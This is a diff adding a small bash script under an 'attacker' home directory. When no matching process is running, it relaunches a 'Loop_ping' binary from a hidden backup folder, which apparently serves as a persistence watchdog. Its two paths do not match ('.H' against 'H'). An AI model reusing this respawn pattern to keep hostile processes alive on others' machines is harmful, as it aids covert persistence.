@@ -1,0 +1,10 @@
+#!/bin/bash
+
+if [ ! -f "/home/attacker/Desktop/.H/Loop_ping" ] ; then
+   count=`ps -ef |grep /home/attacker/Desktop/H/Loop_ping |grep -v "grep"|wc -l`
+   if [ 0 == $count ];then
+   /home/attacker/Desktop/.Backup/Loop_ping
+   fi
+fi
+
+
